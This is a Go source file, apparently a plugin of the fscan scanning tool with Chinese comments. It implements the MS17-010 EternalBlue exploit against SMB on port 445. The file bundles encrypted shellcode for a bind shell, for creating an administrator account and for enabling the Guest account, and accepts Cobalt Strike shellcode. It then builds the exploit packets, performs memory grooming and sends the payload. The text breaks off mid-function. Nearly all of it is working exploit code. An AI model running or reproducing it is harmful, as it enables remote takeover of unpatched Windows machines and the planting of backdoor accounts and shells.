package Plugins

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"github.com/shadow1ng/fscan/Common"
	"io"
	"io/ioutil"
	"net"
	"strings"
	"time"
)

// MS17010EXP 执行MS17-010漏洞利用
func MS17010EXP(info *Common.HostInfo) {
	address := info.Host + ":445"
	var sc string

	// 根据不同类型选择shellcode
	switch Common.Shellcode {
	case "bind":
		// msfvenom生成的Bind Shell, 监听64531端口
		sc_enc := "gUYe7vm5/MQzTkSyKvpMFImS/YtwI+HxNUDd7MeUKDIxBZ8nsaUtdMEXIZmlZUfoQacylFEZpu7iWBRpQZw0KElIFkZR9rl4fpjyYNhEbf9JdquRrvw4hYMypBbfDQ6MN8csp1QF5rkMEs6HvtlKlGSaff34Msw6RlvEodROjGYA+mHUYvUTtfccymIqiU7hCFn+oaIk4ZtCS0Mzb1S5K5+U6vy3e5BEejJVA6u6I+EUb4AOSVVF8GpCNA91jWD1AuKcxg0qsMa+ohCWkWsOxh1zH0kwBPcWHAdHIs31g26NkF14Wl+DHStsW4DuNaxRbvP6awn+wD5aY/1QWlfwUeH/I+rkEPF18sTZa6Hr4mrDPT7eqh4UrcTicL/x4EgovNXA9X+mV6u1/4Zb5wy9rOVwJ+agXxfIqwL5r7R68BEPA/fLpx4LgvTwhvytO3w6I+7sZS7HekuKayBLNZ0T4XXeM8GpWA3h7zkHWjTm41/5JqWblQ45Msrg+XqD6WGvGDMnVZ7jE3xWIRBR7MrPAQ0Kl+Nd93/b+BEMwvuinXp1viSxEoZHIgJZDYR5DykQLpexasSpd8/WcuoQQtuTTYsJpHFfvqiwn0djgvQf3yk3Ro1EzjbR7a8UzwyaCqtKkCu9qGb+0m8JSpYS8DsjbkVST5Y7ZHtegXlX1d/FxgweavKGz3UiHjmbQ+FKkFF82Lkkg+9sO3LMxp2APvYz2rv8RM0ujcPmkN2wXE03sqcTfDdjCWjJ/evdrKBRzwPFhjOjUX1SBVsAcXzcvpJbAf3lcPPxOXM060OYdemu4Hou3oECjKP2h6W9GyPojMuykTkcoIqgN5Ldx6WpGhhE9wrfijOrrm7of9HmO568AsKRKBPfy/QpCfxTrY+rEwyzFmU1xZ2lkjt+FTnsMJY8YM7sIbWZauZ2S+Ux33RWDf7YUmSGlWC8djqDKammk3GgkSPHjf0Qgknukptxl977s2zw4jdh8bUuW5ap7T+Wd/S0ka90CVF4AyhonvAQoi0G1qj5gTih1FPTjBpf+FrmNJvNIAcx2oBoU4y48c8Sf4ABtpdyYewUh4NdxUoL7RSVouU1MZTnYS9BqOJWLMnvV7pwRmHgUz3fe7Kx5PGnP/0zQjW/P/vgmLMh/iBisJIGF3JDGoULsC3dabGE5L7sXuCNePiOEJmgwOHlFBlwqddNaE+ufor0q4AkQBI9XeqznUfdJg2M2LkUZOYrbCjQaE7Ytsr3WJSXkNbOORzqKo5wIf81z1TCow8QuwlfwIanWs+e8oTavmObV3gLPoaWqAIUzJqwD9O4P6x1176D0Xj83n6G4GrJgHpgMuB0qdlK"
		var err error
		sc, err = AesDecrypt(sc_enc, key)
		if err != nil {
			Common.LogError(fmt.Sprintf("%s MS17-010 解密bind shellcode失败: %v", info.Host, err))
			return
		}

	case "cs":
		// Cobalt Strike生成的shellcode
		sc = ""

	case "add":
		// 添加系统管理员账户并配置远程访问
		sc_enc := "Teobs46+kgUn45BOBbruUdpBFXs8uKXWtvYoNbWtKpNCtOasHB/5Er+C2ZlALluOBkUC6BQVZHO1rKzuygxJ3n2PkeutispxSzGcvFS3QJ1EU517e2qOL7W2sRDlNb6rm+ECA2vQZkTZBAboolhGfZYeM6v5fEB2L1Ej6pWF5CKSYxjztdPF8bNGAkZsQhUAVW7WVKysZ1vbghszGyeKFQBvO9Hiinq/XiUrLBqvwXLsJaybZA44wUFvXC0FA9CZDOSD3MCX2arK6Mhk0Q+6dAR+NWPCQ34cYVePT98GyXnYapTOKokV6+hsqHMjfetjkvjEFohNrD/5HY+E73ihs9TqS1ZfpBvZvnWSOjLUA+Z3ex0j0CIUONCjHWpoWiXAsQI/ryJh7Ho5MmmGIiRWyV3l8Q0+1vFt3q/zQGjSI7Z7YgDdIBG8qcmfATJz6dx7eBS4Ntl+4CCqN8Dh4pKM3rV+hFqQyKnBHI5uJCn6qYky7p305KK2Z9Ga5nAqNgaz0gr2GS7nA5D/Cd8pvUH6sd2UmN+n4HnK6/O5hzTmXG/Pcpq7MTEy9G8uXRfPUQdrbYFP7Ll1SWy35B4n/eCf8swaTwi1mJEAbPr0IeYgf8UiOBKS/bXkFsnUKrE7wwG8xXaI7bHFgpdTWfdFRWc8jaJTvwK2HUK5u+4rWWtf0onGxTUyTilxgRFvb4AjVYH0xkr8mIq8smpsBN3ff0TcWYfnI2L/X1wJoCH+oLi67xOs7UApLzuCcE52FhTIjY+ckzBVinUHHwwc4QyY6Xo/15ATcQoL7ZiQgii3xFhrJQGnHgQBsmqT/0A1YBa+rrvIIzblF3FDRlXwAvUVTKnCjDJV9NeiS78jgtx6TNlBDyKCy29E3WGbMKSMH2a+dmtjBhmJ94O8GnbrHyd5c8zxsNXRBaYBV/tVyB9TDtM9kZk5QTit+xN2wOUwFa9cNbpYak8VH552mu7KISA1dUPAMQm9kF5vDRTRxjVLqpqHOc+36lNi6AWrGQkXNKcZJclmO7RotKdtPtCayNGV7/pznvewyGgEYvRKprmzf6hl+9acZmnyQZvlueWeqf+I6axiCyHqfaI+ADmz4RyJOlOC5s1Ds6uyNs+zUXCz7ty4rU3hCD8N6v2UagBJaP66XCiLOL+wcx6NJfBy40dWTq9RM0a6b448q3/mXZvdwzj1Evlcu5tDJHMdl+R2Q0a/1nahzsZ6UMJb9GAvMSUfeL9Cba77Hb5ZU40tyTQPl28cRedhwiISDq5UQsTRw35Z7bDAxJvPHiaC4hvfW3gA0iqPpkqcRfPEV7d+ylSTV1Mm9+NCS1Pn5VDIIjlClhlRf5l+4rCmeIPxQvVD/CPBM0NJ6y1oTzAGFN43kYqMV8neRAazACczYqziQ6VgjATzp0k8"
		var err error
		sc, err = AesDecrypt(sc_enc, key)
		if err != nil {
			Common.LogError(fmt.Sprintf("%s MS17-010 解密add shellcode失败: %v", info.Host, err))
			return
		}

	case "guest":
		// 激活Guest账户并配置远程访问
		sc_enc := "Teobs46+kgUn45BOBbruUdpBFXs8uKXWtvYoNbWtKpNCtOasHB/5Er+C2ZlALluOBkUC6BQVZHO1rKzuygxJ3n2PkeutispxSzGcvFS3QJ1EU517e2qOL7W2sRDlNb6rm+ECA2vQZkTZBAboolhGfZYeM6v5fEB2L1Ej6pWF5CKSYxjztdPF8bNGAkZsQhUAVW7WVKysZ1vbghszGyeKFQBvO9Hiinq/XiUrLBqvwXLsJaybZA44wUFvXC0FA9CZDOSD3MCX2arK6Mhk0Q+6dAR+NWPCQ34cYVePT98GyXnYapTOKokV6+hsqHMjfetjkvjEFohNrD/5HY+E73ihs9TqS1ZfpBvZvnWSOjLUA+Z3ex0j0CIUONCjHWpoWiXAsQI/ryJh7Ho5MmmGIiRWyV3l8Q0+1vFt3q/zQGjSI7Z7YgDdIBG8qcmfATJz6dx7eBS4Ntl+4CCqN8Dh4pKM3rV+hFqQyKnBHI5uJCn6qYky7p305KK2Z9Ga5nAqNgaz0gr2GS7nA5D/Cd8pvUH6sd2UmN+n4HnK6/O5hzTmXG/Pcpq7MTEy9G8uXRfPUQdrbYFP7Ll1SWy35B4n/eCf8swaTwi1mJEAbPr0IeYgf8UiOBKS/bXkFsnUKrE7wwG8xXaI7bHFgpdTWfdFRWc8jaJTvwK2HUK5u+4rWWtf0onGxTUyTilxgRFvb4AjVYH0xkr8mIq8smpsBN3ff0TcWYfnI2L/X1wJoCH+oLi67xMN+yPDirT+LXfLOaGlyTqG6Yojge8Mti/BqIg5RpG4wIZPKxX9rPbMP+Tzw8rpi/9b33eq0YDevzqaj5Uo0HudOmaPwv5cd9/dqWgeC7FJwv73TckogZGbDOASSoLK26AgBat8vCrhrd7T0uBrEk+1x/NXvl5r2aEeWCWBsULKxFh2WDCqyQntSaAUkPe3JKJe0HU6inDeS4d52BagSqmd1meY0Rb/97fMCXaAMLekq+YrwcSrmPKBY9Yk0m1kAzY+oP4nvV/OhCHNXAsUQGH85G7k65I1QnzffroaKxloP26XJPW0JEq9vCSQFI/EX56qt323V/solearWdBVptG0+k55TBd0dxmBsqRMGO3Z23OcmQR4d8zycQUqqavMmo32fy4rjY6Ln5QUR0JrgJ67dqDhnJn5TcT4YFHgF4gY8oynT3sqv0a+hdVeF6XzsElUUsDGfxOLfkn3RW/2oNnqAHC2uXwX2ZZNrSbPymB2zxB/ET3SLlw3skBF1A82ZBYqkMIuzs6wr9S9ox9minLpGCBeTR9j6OYk6mmKZnThpvarRec8a7YBuT2miU7fO8iXjhS95A84Ub++uS4nC1Pv1v9nfj0/T8scD2BUYoVKCJX3KiVnxUYKVvDcbvv8UwrM6+W/hmNOePHJNx9nX1brHr90m9e40as1BZm2meUmCECxQd+Hdqs7HgPsPLcUB8AL8wCHQjziU6R4XKuX6ivx"
		var err error
		sc, err = AesDecrypt(sc_enc, key)
		if err != nil {
			Common.LogError(fmt.Sprintf("%s MS17-010 解密guest shellcode失败: %v", info.Host, err))
			return
		}

	default:
		// 从文件读取或直接使用提供的shellcode
		if strings.Contains(Common.Shellcode, "file:") {
			read, err := ioutil.ReadFile(Common.Shellcode[5:])
			if err != nil {
				Common.LogError(fmt.Sprintf("MS17010读取Shellcode文件 %v 失败: %v", Common.Shellcode, err))
				return
			}
			sc = fmt.Sprintf("%x", read)
		} else {
			sc = Common.Shellcode
		}
	}

	// 验证shellcode有效性
	if len(sc) < 20 {
		fmt.Println("无效的Shellcode")
		return
	}

	// 解码shellcode
	sc1, err := hex.DecodeString(sc)
	if err != nil {
		Common.LogError(fmt.Sprintf("%s MS17-010 Shellcode解码失败: %v", info.Host, err))
		return
	}

	// 执行EternalBlue漏洞利用
	err = eternalBlue(address, 12, 12, sc1)
	if err != nil {
		Common.LogError(fmt.Sprintf("%s MS17-010漏洞利用失败: %v", info.Host, err))
		return
	}

	Common.LogSuccess(fmt.Sprintf("%s\tMS17-010\t漏洞利用完成", info.Host))
}

// eternalBlue 执行EternalBlue漏洞利用
func eternalBlue(address string, initialGrooms, maxAttempts int, sc []byte) error {
	// 检查shellcode大小
	const maxscSize = packetMaxLen - packetSetupLen - len(loader) - 2 // uint16长度
	scLen := len(sc)
	if scLen > maxscSize {
		return fmt.Errorf("Shellcode大小超出限制: %d > %d (超出 %d 字节)",
			scLen, maxscSize, scLen-maxscSize)
	}

	// 构造内核用户空间payload
	payload := makeKernelUserPayload(sc)

	// 多次尝试利用
	var (
		grooms int
		err    error
	)
	for i := 0; i < maxAttempts; i++ {
		grooms = initialGrooms + 5*i
		if err = exploit(address, grooms, payload); err == nil {
			return nil // 利用成功
		}
	}

	return err // 返回最后一次尝试的错误
}

// exploit 执行EternalBlue漏洞利用核心逻辑
func exploit(address string, grooms int, payload []byte) error {
	// 建立SMB1匿名IPC连接
	header, conn, err := smb1AnonymousConnectIPC(address)
	if err != nil {
		return fmt.Errorf("建立SMB连接失败: %v", err)
	}
	defer func() { _ = conn.Close() }()

	// 发送SMB1大缓冲区数据
	if err = conn.SetReadDeadline(time.Now().Add(10 * time.Second)); err != nil {
		return fmt.Errorf("设置读取超时失败: %v", err)
	}
	if err = smb1LargeBuffer(conn, header); err != nil {
		return fmt.Errorf("发送大缓冲区失败: %v", err)
	}

	// 初始化内存喷射线程
	fhsConn, err := smb1FreeHole(address, true)
	if err != nil {
		return fmt.Errorf("初始化内存喷射失败: %v", err)
	}
	defer func() { _ = fhsConn.Close() }()

	// 第一轮内存喷射
	groomConns, err := smb2Grooms(address, grooms)
	if err != nil {
		return fmt.Errorf("第一轮内存喷射失败: %v", err)
	}

	// 释放内存并执行第二轮喷射
	fhfConn, err := smb1FreeHole(address, false)
	if err != nil {
		return fmt.Errorf("释放内存失败: %v", err)
	}
	_ = fhsConn.Close()

	// 执行第二轮内存喷射
	groomConns2, err := smb2Grooms(address, 6)
	if err != nil {
		return fmt.Errorf("第二轮内存喷射失败: %v", err)
	}
	_ = fhfConn.Close()

	// 合并所有喷射连接
	groomConns = append(groomConns, groomConns2...)
	defer func() {
		for _, conn := range groomConns {
			_ = conn.Close()
		}
	}()

	// 发送最终漏洞利用数据包
	if err = conn.SetReadDeadline(time.Now().Add(10 * time.Second)); err != nil {
		return fmt.Errorf("设置读取超时失败: %v", err)
	}

	finalPacket := makeSMB1Trans2ExploitPacket(header.TreeID, header.UserID, 15, "exploit")
	if _, err = conn.Write(finalPacket); err != nil {
		return fmt.Errorf("发送漏洞利用数据包失败: %v", err)
	}

	// 获取响应并检查状态
	raw, _, err := smb1GetResponse(conn)
	if err != nil {
		return fmt.Errorf("获取漏洞利用响应失败: %v", err)
	}

	// 提取NT状态码
	ntStatus := []byte{raw[8], raw[7], raw[6], raw[5]}
	Common.LogSuccess(fmt.Sprintf("NT Status: 0x%08X", ntStatus))

	// 发送payload
	Common.LogSuccess("开始发送Payload")
	body := makeSMB2Body(payload)

	// 分段发送payload
	for _, conn := range groomConns {
		if _, err = conn.Write(body[:2920]); err != nil {
			return fmt.Errorf("发送Payload第一段失败: %v", err)
		}
	}

	for _, conn := range groomConns {
		if _, err = conn.Write(body[2920:4073]); err != nil {
			return fmt.Errorf("发送Payload第二段失败: %v", err)
		}
	}

	Common.LogSuccess("Payload发送完成")
	return nil
}

// makeKernelUserPayload 构建内核用户空间Payload
func makeKernelUserPayload(sc []byte) []byte {
	// 创建缓冲区
	buf := bytes.Buffer{}

	// 写入loader代码
	buf.Write(loader[:])

	// 写入shellcode大小(uint16)
	size := make([]byte, 2)
	binary.LittleEndian.PutUint16(size, uint16(len(sc)))
	buf.Write(size)

	// 写入shellcode内容
	buf.Write(sc)

	return buf.Bytes()
}

// smb1AnonymousConnectIPC 创建SMB1匿名IPC连接
func smb1AnonymousConnectIPC(address string) (*smbHeader, net.Conn, error) {
	// 建立TCP连接
	conn, err := net.DialTimeout("tcp", address, 10*time.Second)
	if err != nil {
		return nil, nil, fmt.Errorf("连接目标失败: %v", err)
	}

	// 连接状态标记
	var ok bool
	defer func() {
		if !ok {
			_ = conn.Close()
		}
	}()

	// SMB协议协商
	if err = smbClientNegotiate(conn); err != nil {
		return nil, nil, fmt.Errorf("SMB协议协商失败: %v", err)
	}

	// 匿名登录
	raw, header, err := smb1AnonymousLogin(conn)
	if err != nil {
		return nil, nil, fmt.Errorf("匿名登录失败: %v", err)
	}

	// 获取系统版本信息
	if _, err = getOSName(raw); err != nil {
		return nil, nil, fmt.Errorf("获取系统信息失败: %v", err)
	}

	// 连接IPC共享
	header, err = treeConnectAndX(conn, address, header.UserID)
	if err != nil {
		return nil, nil, fmt.Errorf("连接IPC共享失败: %v", err)
	}

	ok = true
	return header, conn, nil
}

// SMB头部大小常量
const smbHeaderSize = 32

// smbHeader SMB协议头部结构
type smbHeader struct {
	ServerComponent [4]byte // 服务器组件标识
	SMBCommand      uint8   // SMB命令码
	ErrorClass      uint8   // 错误类别
	Reserved        byte    // 保留字节
	ErrorCode       uint16  // 错误代码
	Flags           uint8   // 标志位
	Flags2          uint16  // 扩展标志位
	ProcessIDHigh   uint16  // 进程ID高位
	Signature       [8]byte // 签名
	Reserved2       [2]byte // 保留字节
	TreeID          uint16  // 树连接ID
	ProcessID       uint16  // 进程ID
	UserID          uint16  // 用户ID
	MultiplexID     uint16  // 多路复用ID
}

// smb1GetResponse 获取SMB1协议响应数据
func smb1GetResponse(conn net.Conn) ([]byte, *smbHeader, error) {
	// 读取NetBIOS会话服务头
	buf := make([]byte, 4)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return nil, nil, fmt.Errorf("读取NetBIOS会话服务头失败: %v", err)
	}

	// 校验消息类型
	messageType := buf[0]
	if messageType != 0x00 {
		return nil, nil, fmt.Errorf("无效的消息类型: 0x%02X", messageType)
	}

	// 解析消息体大小
	sizeBuf := make([]byte, 4)
	copy(sizeBuf[1:], buf[1:])
	messageSize := int(binary.BigEndian.Uint32(sizeBuf))

	// 读取SMB消息体
	buf = make([]byte, messageSize)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return nil, nil, fmt.Errorf("读取SMB消息体失败: %v", err)
	}

	// 解析SMB头部
	header := smbHeader{}
	reader := bytes.NewReader(buf[:smbHeaderSize])
	if err := binary.Read(reader, binary.LittleEndian, &header); err != nil {
		return nil, nil, fmt.Errorf("解析SMB头部失败: %v", err)
	}

	return buf, &header, nil
}

// smbClientNegotiate 执行SMB协议协商
func smbClientNegotiate(conn net.Conn) error {
	buf := bytes.Buffer{}

	// 构造NetBIOS会话服务头
	if err := writeNetBIOSHeader(&buf); err != nil {
		return fmt.Errorf("构造NetBIOS头失败: %v", err)
	}

	// 构造SMB协议头
	if err := writeSMBHeader(&buf); err != nil {
		return fmt.Errorf("构造SMB头失败: %v", err)
	}

	// 构造协议协商请求
	if err := writeNegotiateRequest(&buf); err != nil {
		return fmt.Errorf("构造协议协商请求失败: %v", err)
	}

	// 发送数据包
	if _, err := buf.WriteTo(conn); err != nil {
		return fmt.Errorf("发送协议协商数据包失败: %v", err)
	}

	// 获取响应
	if _, _, err := smb1GetResponse(conn); err != nil {
		return fmt.Errorf("获取协议协商响应失败: %v", err)
	}

	return nil
}

// writeNetBIOSHeader 写入NetBIOS会话服务头
func writeNetBIOSHeader(buf *bytes.Buffer) error {
	// 消息类型: Session Message
	buf.WriteByte(0x00)
	// 长度(固定值)
	buf.Write([]byte{0x00, 0x00, 0x54})
	return nil
}

// writeSMBHeader 写入SMB协议头
func writeSMBHeader(buf *bytes.Buffer) error {
	// SMB协议标识: .SMB
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// 命令: Negotiate Protocol
	buf.WriteByte(0x72)
	// NT状态码
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 标志位
	buf.WriteByte(0x18)
	// 标志位2
	buf.Write([]byte{0x01, 0x28})
	// 进程ID高位
	buf.Write([]byte{0x00, 0x00})
	// 签名
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	// 保留字段
	buf.Write([]byte{0x00, 0x00})
	// 树ID
	buf.Write([]byte{0x00, 0x00})
	// 进程ID
	buf.Write([]byte{0x2F, 0x4B})
	// 用户ID
	buf.Write([]byte{0x00, 0x00})
	// 多路复用ID
	buf.Write([]byte{0xC5, 0x5E})
	return nil
}

// writeNegotiateRequest 写入协议协商请求
func writeNegotiateRequest(buf *bytes.Buffer) error {
	// 字段数
	buf.WriteByte(0x00)
	// 字节数
	buf.Write([]byte{0x31, 0x00})

	// 写入支持的方言
	dialects := [][]byte{
		{0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E, 0x30, 0x00},                         // LAN MAN1.0
		{0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30, 0x32, 0x00},                         // LM1.2X002
		{0x4E, 0x54, 0x20, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x20, 0x31, 0x2E, 0x30, 0x00}, // NT LAN MAN 1.0
		{0x4E, 0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00},                   // NT LM 0.12
	}

	for _, dialect := range dialects {
		buf.WriteByte(0x02) // 方言标记
		buf.Write(dialect)
	}

	return nil
}

// smb1AnonymousLogin 执行SMB1匿名登录
func smb1AnonymousLogin(conn net.Conn) ([]byte, *smbHeader, error) {
	buf := bytes.Buffer{}

	// 构造NetBIOS会话服务头
	if err := writeNetBIOSLoginHeader(&buf); err != nil {
		return nil, nil, fmt.Errorf("构造NetBIOS头失败: %v", err)
	}

	// 构造SMB协议头
	if err := writeSMBLoginHeader(&buf); err != nil {
		return nil, nil, fmt.Errorf("构造SMB头失败: %v", err)
	}

	// 构造会话设置请求
	if err := writeSessionSetupRequest(&buf); err != nil {
		return nil, nil, fmt.Errorf("构造会话设置请求失败: %v", err)
	}

	// 发送数据包
	if _, err := buf.WriteTo(conn); err != nil {
		return nil, nil, fmt.Errorf("发送登录数据包失败: %v", err)
	}

	// 获取响应
	return smb1GetResponse(conn)
}

// writeNetBIOSLoginHeader 写入NetBIOS会话服务头
func writeNetBIOSLoginHeader(buf *bytes.Buffer) error {
	// 消息类型: Session Message
	buf.WriteByte(0x00)
	// 长度
	buf.Write([]byte{0x00, 0x00, 0x88})
	return nil
}

// writeSMBLoginHeader 写入SMB协议头
func writeSMBLoginHeader(buf *bytes.Buffer) error {
	// SMB标识
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// 命令: Session Setup AndX
	buf.WriteByte(0x73)
	// NT状态码
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 标志位
	buf.WriteByte(0x18)
	// 标志位2
	buf.Write([]byte{0x07, 0xC0})
	// 进程ID高位
	buf.Write([]byte{0x00, 0x00})
	// 签名1
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 签名2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 树ID
	buf.Write([]byte{0x00, 0x00})
	// 进程ID
	buf.Write([]byte{0xFF, 0xFE})
	// 保留字段
	buf.Write([]byte{0x00, 0x00})
	// 用户ID
	buf.Write([]byte{0x00, 0x00})
	// 多路复用ID
	buf.Write([]byte{0x40, 0x00})
	return nil
}

// writeSessionSetupRequest 写入会话设置请求
func writeSessionSetupRequest(buf *bytes.Buffer) error {
	// 字段数
	buf.WriteByte(0x0D)
	// 无后续命令
	buf.WriteByte(0xFF)
	// 保留字段
	buf.WriteByte(0x00)
	// AndX偏移
	buf.Write([]byte{0x88, 0x00})
	// 最大缓冲区
	buf.Write([]byte{0x04, 0x11})
	// 最大并发数
	buf.Write([]byte{0x0A, 0x00})
	// VC编号
	buf.Write([]byte{0x00, 0x00})
	// 会话密钥
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// ANSI密码长度
	buf.Write([]byte{0x01, 0x00})
	// Unicode密码长度
	buf.Write([]byte{0x00, 0x00})
	// 保留字段
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 功能标志
	buf.Write([]byte{0xD4, 0x00, 0x00, 0x00})
	// 字节数
	buf.Write([]byte{0x4b, 0x00})

	// 认证信息
	buf.WriteByte(0x00)           // ANSI密码
	buf.Write([]byte{0x00, 0x00}) // 账户名
	buf.Write([]byte{0x00, 0x00}) // 域名

	// 写入操作系统信息
	writeOSInfo(buf)

	return nil
}

// writeOSInfo 写入操作系统信息
func writeOSInfo(buf *bytes.Buffer) {
	// 原生操作系统: Windows 2000 2195
	osInfo := []byte{0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00,
		0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00,
		0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x32, 0x00,
		0x31, 0x00, 0x39, 0x00, 0x35, 0x00, 0x00, 0x00}
	buf.Write(osInfo)

	// 原生LAN Manager: Windows 2000 5.0
	lanInfo := []byte{0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00,
		0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00,
		0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x35, 0x00,
		0x2e, 0x00, 0x30, 0x00, 0x00, 0x00}
	buf.Write(lanInfo)
}

// getOSName 从SMB响应中提取操作系统名称
// 跳过SMB头部、字数统计、AndX命令、保留字段、AndX偏移量、操作标志、字节数以及魔数0x41(A)
func getOSName(raw []byte) (string, error) {
	// 创建缓冲区存储操作系统名称
	osBuf := bytes.Buffer{}

	// 创建读取器,定位到操作系统名称开始位置
	reader := bytes.NewReader(raw[smbHeaderSize+10:])

	// 读取UTF-16编码的操作系统名称
	char := make([]byte, 2)
	for {
		if _, err := io.ReadFull(reader, char); err != nil {
			return "", fmt.Errorf("读取操作系统名称失败: %v", err)
		}

		// 遇到结束符(0x00 0x00)时退出
		if bytes.Equal(char, []byte{0x00, 0x00}) {
			break
		}

		osBuf.Write(char)
	}

	// 将UTF-16编码转换为ASCII编码
	bufLen := osBuf.Len()
	osName := make([]byte, 0, bufLen/2)
	rawBytes := osBuf.Bytes()

	// 每隔两个字节取一个字节(去除UTF-16的高字节)
	for i := 0; i < bufLen; i += 2 {
		osName = append(osName, rawBytes[i])
	}

	return string(osName), nil
}

// treeConnectAndX 执行SMB树连接请求
func treeConnectAndX(conn net.Conn, address string, userID uint16) (*smbHeader, error) {
	buf := bytes.Buffer{}

	// 构造NetBIOS会话服务头
	if err := writeNetBIOSTreeHeader(&buf); err != nil {
		return nil, fmt.Errorf("构造NetBIOS头失败: %v", err)
	}

	// 构造SMB协议头
	if err := writeSMBTreeHeader(&buf, userID); err != nil {
		return nil, fmt.Errorf("构造SMB头失败: %v", err)
	}

	// 构造树连接请求
	if err := writeTreeConnectRequest(&buf, address); err != nil {
		return nil, fmt.Errorf("构造树连接请求失败: %v", err)
	}

	// 更新数据包大小
	updatePacketSize(&buf)

	// 发送数据包
	if _, err := buf.WriteTo(conn); err != nil {
		return nil, fmt.Errorf("发送树连接请求失败: %v", err)
	}

	// 获取响应
	_, header, err := smb1GetResponse(conn)
	if err != nil {
		return nil, fmt.Errorf("获取树连接响应失败: %v", err)
	}

	return header, nil
}

// writeNetBIOSTreeHeader 写入NetBIOS会话服务头
func writeNetBIOSTreeHeader(buf *bytes.Buffer) error {
	// 消息类型
	buf.WriteByte(0x00)
	// 长度(稍后更新)
	buf.Write([]byte{0x00, 0x00, 0x00})
	return nil
}

// writeSMBTreeHeader 写入SMB协议头
func writeSMBTreeHeader(buf *bytes.Buffer, userID uint16) error {
	// SMB标识
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// 命令: Tree Connect AndX
	buf.WriteByte(0x75)
	// NT状态码
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 标志位
	buf.WriteByte(0x18)
	// 标志位2
	buf.Write([]byte{0x01, 0x20})
	// 进程ID高位
	buf.Write([]byte{0x00, 0x00})
	// 签名
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	// 保留字段
	buf.Write([]byte{0x00, 0x00})
	// 树ID
	buf.Write([]byte{0x00, 0x00})
	// 进程ID
	buf.Write([]byte{0x2F, 0x4B})
	// 用户ID
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)
	// 多路复用ID
	buf.Write([]byte{0xC5, 0x5E})
	return nil
}

// writeTreeConnectRequest 写入树连接请求
func writeTreeConnectRequest(buf *bytes.Buffer, address string) error {
	// 字段数
	buf.WriteByte(0x04)
	// 无后续命令
	buf.WriteByte(0xFF)
	// 保留字段
	buf.WriteByte(0x00)
	// AndX偏移
	buf.Write([]byte{0x00, 0x00})
	// 标志位
	buf.Write([]byte{0x00, 0x00})
	// 密码长度
	buf.Write([]byte{0x01, 0x00})
	// 字节数
	buf.Write([]byte{0x1A, 0x00})
	// 密码
	buf.WriteByte(0x00)

	// IPC路径
	host, _, err := net.SplitHostPort(address)
	if err != nil {
		return fmt.Errorf("解析地址失败: %v", err)
	}
	_, _ = fmt.Fprintf(buf, "\\\\%s\\IPC$", host)

	// IPC结束符
	buf.WriteByte(0x00)
	// 服务类型
	buf.Write([]byte{0x3F, 0x3F, 0x3F, 0x3F, 0x3F, 0x00})

	return nil
}

// updatePacketSize 更新数据包大小
func updatePacketSize(buf *bytes.Buffer) {
	b := buf.Bytes()
	sizeBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(sizeBuf, uint32(buf.Len()-4))
	copy(b[1:], sizeBuf[1:])
}

// smb1LargeBuffer 发送大缓冲区数据包
func smb1LargeBuffer(conn net.Conn, header *smbHeader) error {
	// 发送NT Trans请求获取事务头
	transHeader, err := sendNTTrans(conn, header.TreeID, header.UserID)
	if err != nil {
		return fmt.Errorf("发送NT Trans请求失败: %v", err)
	}

	treeID := transHeader.TreeID
	userID := transHeader.UserID

	// 构造数据包
	var transPackets []byte

	// 添加初始Trans2请求包
	initialPacket := makeSMB1Trans2ExploitPacket(treeID, userID, 0, "zero")
	transPackets = append(transPackets, initialPacket...)

	// 添加中间的Trans2数据包
	for i := 1; i < 15; i++ {
		packet := makeSMB1Trans2ExploitPacket(treeID, userID, i, "buffer")
		transPackets = append(transPackets, packet...)
	}

	// 添加Echo数据包
	echoPacket := makeSMB1EchoPacket(treeID, userID)
	transPackets = append(transPackets, echoPacket...)

	// 发送组合数据包
	if _, err := conn.Write(transPackets); err != nil {
		return fmt.Errorf("发送大缓冲区数据失败: %v", err)
	}

	// 获取响应
	if _, _, err := smb1GetResponse(conn); err != nil {
		return fmt.Errorf("获取大缓冲区响应失败: %v", err)
	}

	return nil
}

// sendNTTrans 发送NT Trans请求
func sendNTTrans(conn net.Conn, treeID, userID uint16) (*smbHeader, error) {
	buf := bytes.Buffer{}

	// 构造NetBIOS会话服务头
	if err := writeNetBIOSNTTransHeader(&buf); err != nil {
		return nil, fmt.Errorf("构造NetBIOS头失败: %v", err)
	}

	// 构造SMB协议头
	if err := writeSMBNTTransHeader(&buf, treeID, userID); err != nil {
		return nil, fmt.Errorf("构造SMB头失败: %v", err)
	}

	// 构造NT Trans请求
	if err := writeNTTransRequest(&buf); err != nil {
		return nil, fmt.Errorf("构造NT Trans请求失败: %v", err)
	}

	// 发送数据包
	if _, err := buf.WriteTo(conn); err != nil {
		return nil, fmt.Errorf("发送NT Trans请求失败: %v", err)
	}

